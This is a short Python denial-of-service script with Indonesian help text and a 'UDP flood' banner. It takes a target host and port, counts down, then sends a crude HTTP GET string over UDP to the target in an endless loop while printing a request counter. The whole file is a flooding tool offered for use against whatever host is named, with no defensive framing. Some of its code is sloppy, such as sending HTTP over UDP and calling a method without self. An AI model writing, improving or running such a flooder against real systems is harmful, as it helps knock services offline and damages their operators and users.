import socket
import sys
import optparse
import os
import time

count = 0

setting = optparse.OptionParser()
setting.add_option("--host", dest="host")
setting.add_option("--port", dest="port")
setting.add_option("--msg", dest="msg")
opts , args = setting.parse_args()
host = opts.host
port = opts.port
msg = opts.msg

class colors:
    PURPLE = '\033[95m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    BLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OLDGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    YELLOW = '\033[33m'

class helps:
	def __init__(self):
		print("""{} __  __  ____    ____           ___  ___                       __     
/\ \/\ \/\  _`\ /\  _`\       /'___\/\_ \                     /\ \    
\ \ \ \ \ \ \/\ \ \ \L\ \    /\ \__/\//\ \     ___     ___    \_\ \   
 \ \ \ \ \ \ \ \ \ \ ,__/    \ \ ,__\ \ \ \   / __`\  / __`\  /'_` \  
  \ \ \_\ \ \ \_\ \ \ \/      \ \ \_/  \_\ \_/\ \L\ \/\ \L\ \/\ \L\ \ 
   \ \_____\ \____/\ \_\       \ \_\   /\____\ \____/\ \____/\ \___,_\
               \/_____/\/___/  \/_/        \/_/   \/____/\/___/  \/___/  \/__,_ /
                                                                      
--host = Untuk memasukkan nama host
--port = Untuk memasukkan nomor port(80)
--msg = untuk memasukkan pesan (selain port 80)
{}""".format(colors.PURPLE,colors.ENDC))

	def dos():
		global host,port,count,msg
		sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
		ip = socket.gethostbyname(host)
		print("{}IP = {} port = {}".format(colors.RED,ip,port))
		print("Hitungan mundur dalam 3")
		time.sleep(1)
		print("Hitungan mundur dalam 2")
		time.sleep(1)
		print("Hitungan mundur dalam 1{}".format(colors.ENDC))
		time.sleep(1)
		os.system("clear")
		time.sleep(1)
		while(True):
			request = "GET / \nHTTP/1.1\n HOST: {}\n".format(host).encode()
			count += 1
			print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE,count,colors.ENDC))
			sock.sendto(request,(str(ip) , int(port)))

if len(sys.argv) == 1:
	helps()
if port == "80":
	helps.dos()